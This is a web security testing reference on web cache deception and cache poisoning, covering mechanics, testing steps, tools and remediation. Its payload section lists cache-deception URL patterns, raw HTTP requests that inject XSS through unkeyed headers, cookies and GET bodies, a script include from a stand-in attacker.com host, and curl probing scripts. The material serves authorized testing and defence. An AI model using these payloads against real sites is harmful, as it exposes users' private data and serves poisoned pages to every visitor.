# Web Cache Deception / Poisoning

## Overview
Web Cache Deception tricks a caching layer (CDN, reverse proxy, or application cache) into caching sensitive, user-specific content as if it were a public static resource, so that a subsequent request by any user retrieves the victim's data. Web Cache Poisoning, a related but distinct attack, injects malicious content into a cached response by manipulating unkeyed inputs (headers, parameters), so that cached poison is served to all users who request that resource. Both vulnerabilities stem from a mismatch between how the cache and the application determine what to cache and what constitutes a "cache key."

## How It Works
**Web Cache Deception:** The attacker tricks the victim into requesting a URL like:
```
https://target.com/account/profile/nonexistent.css
```
The application ignores the `.css` suffix, processes the request as `/account/profile`, and returns the victim's private profile page. The CDN, however, sees `.css` and caches the response (private user data) as a public asset. The attacker then requests the same URL from their own browser and receives the cached private data.

**Web Cache Poisoning:** The attacker sends a request with an unkeyed header (e.g., `X-Forwarded-Host`) that the application uses to generate a URL in the response. The cache stores the poisoned response and serves it to all subsequent users:
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
If the response includes `<script src="https://attacker.com/evil.js">`, and this response is cached, all users receive the poisoned page.

## Impact
- Cache Deception: theft of private account data, session tokens, API keys, PII
- Cache Deception: full account takeover if CSRF tokens or session data are cached
- Cache Poisoning: stored XSS delivered at CDN scale (every user gets the poisoned response)
- Cache Poisoning: denial of service by poisoning error pages or redirect loops
- Cache Poisoning: credential phishing via poisoned login page redirects
- Data integrity violations — users receive stale or manipulated content

## Where to Look
**Cache Deception:**
- Authenticated endpoints that serve user-specific data
- Applications that ignore path suffixes or accept arbitrary path extensions
- CDN or cache configurations that cache based on file extension
- URLs like `/account`, `/dashboard`, `/profile`, `/settings`, `/inbox`

**Cache Poisoning:**
- HTTP headers reflected into the response body or `Location` header: `X-Forwarded-Host`, `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`
- Unkeyed query parameters that appear in the response
- Unkeyed cookies or request headers used in response generation
- Fat GET requests — GET requests with a body that influences the response
- `Vary` response header — understand which headers are part of the cache key

## Testing Steps
**Cache Deception:**
1. Identify authenticated endpoints that return personal data.
2. Append a fake static file extension: `/account/profile.css`, `/account/profile.js`, `/dashboard.png`.
3. Send this URL while authenticated and check if the response contains your personal data.
4. Make the same request without authentication (new browser/incognito). If you receive the cached personal data — vulnerable.
5. Test variations: `/account;.css`, `/account/.css`, `/account%0a.css`.
6. Check the response for cache headers: `Cache-Control`, `X-Cache`, `CF-Cache-Status`, `Age`.

**Cache Poisoning:**
1. Identify caching behavior: look for `Age`, `X-Cache: HIT`, `CF-Cache-Status: HIT` headers.
2. Add unusual headers to a request and look for them reflected in the response:
   ```bash
   curl -H "X-Forwarded-Host: attacker.com" https://target.com/ -v
   ```
3. If `X-Forwarded-Host` is reflected, try to poison a cacheable URL.
4. Use Param Miner to discover unkeyed inputs automatically.
5. Send a poisoning request and then immediately fetch the resource without the malicious header — if you see the poisoned content, it is cached.
6. Check for `Vary` header mismatches between poisoning request and normal request.
7. Test fat GET: send a GET request with a body that alters the response.
8. Test `X-Original-URL` and `X-Rewrite-URL` headers for path override.

## Payloads / Techniques

Cache Deception URL patterns:
```
https://target.com/account.css
https://target.com/dashboard.js
https://target.com/profile.png
https://target.com/settings.css?x=1
https://target.com/account/../../account.css
https://target.com/account;.css
https://target.com/account%2f.css
https://target.com/account%0a.css
https://target.com/account%09.css  (tab character)
```

Cache Deception with path parameter confusion:
```
https://target.com/account/profile/..%2f..%2fnonexistent.css
https://target.com/;nonexistent.css/account/profile
```

Cache Poisoning via X-Forwarded-Host:
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Cache Poisoning via Host header (if directly used):
```http
GET / HTTP/1.1
Host: attacker.com
```

Cache Poisoning — injecting XSS via reflected header:
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(document.domain)</script>
```

Cache Poisoning — poisoning a JavaScript file import:
```http
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
# If app.js includes dynamically generated imports from host, it gets poisoned
```

Cache Poisoning via unkeyed query parameter:
```
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
# If utm_content is unkeyed (not part of cache key) but reflected in response
```

Cache Poisoning via cookie:
```http
GET /page HTTP/1.1
Cookie: session=legitimate; language=en"><script>alert(1)</script>
# If language cookie is unkeyed but reflected
```

Fat GET request:
```http
GET /api/data HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param="><script>alert(1)</script>
# If body param is reflected in cached GET response
```

curl test for cache poisoning:
```bash
# Step 1: Send poison
curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/page -v 2>&1 | grep -i "x-cache\|age\|cf-cache"

# Step 2: Fetch without poison header (simulating another user)
curl -s https://target.com/page | grep attacker.com
```

Param Miner equivalent (manual check for unkeyed headers):
```bash
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" "X-Original-URL" "X-Rewrite-URL" "Forwarded" "X-Forwarded-For"; do
  echo "Testing: $header"
  curl -s -H "$header: canary-$(date +%s)" https://target.com/ | grep -i canary
done
```

## Burp Suite Tips
- Use the **Param Miner** extension — it automatically discovers unkeyed headers and query parameters by comparing responses with and without injected values. Essential for cache poisoning.
- In **Repeater**, send a request with a custom header, cache-bust the URL (add a unique query parameter), then remove the header and resend to the same URL — if the poisoned content persists, it is cached.
- Add `Cache-Buster: <unique>` as an unkeyed parameter during testing to avoid poisoning the real cache: use a different buster each time.
- Check the **`Vary` response header** — it tells you which request headers are part of the cache key.
- Use **Collaborator** to detect blind cache poisoning (attacker.com resolves to a Collaborator server; if the poisoned content causes an HTTP request, you'll see it).
- The **Web Cache Deception Scanner** (Burp extension) automates the detection of cache deception vulnerabilities.

## Tools
- Burp Suite + Param Miner extension — primary tool for unkeyed input discovery
- Web Cache Vulnerability Scanner (wcvs) — https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
- nuclei with cache-deception templates — automated scanning
- curl — manual request crafting and header manipulation
- ffuf — fuzzing cache keys
- CacheBleed PoC scripts — for legacy Varnish/nginx cache vulnerabilities

## Remediation
**Cache Deception:**
- Ensure the cache does not serve authenticated content based on file extension alone.
- Configure cache rules based on `Cache-Control` response headers, not URL patterns.
- Send `Cache-Control: no-store, private` on all responses that contain user-specific data.
- Configure the CDN/reverse proxy to only cache explicitly marked responses.
- Reject or normalize URLs with unexpected path suffixes before processing.

**Cache Poisoning:**
- Include all headers that influence the response in the cache key (configure `Vary` correctly).
- Strip or ignore unrecognized forwarding headers at the reverse proxy level.
- Do not use `X-Forwarded-Host`, `X-Host`, or similar headers in response generation without validation.
- Validate that the `Host` header matches an expected domain before using it in responses.
- Add unique cache-buster parameters to distinguish cache entries during testing.
- Implement HTTP response header `Cache-Control: no-store` for all dynamic responses.

## References
https://portswigger.net/research/web-cache-deception
https://portswigger.net/research/practical-web-cache-poisoning
https://portswigger.net/web-security/web-cache-poisoning
https://owasp.org/www-community/attacks/Cache_Poisoning
https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner
https://youst.in/posts/cache-poisoning-at-scale/
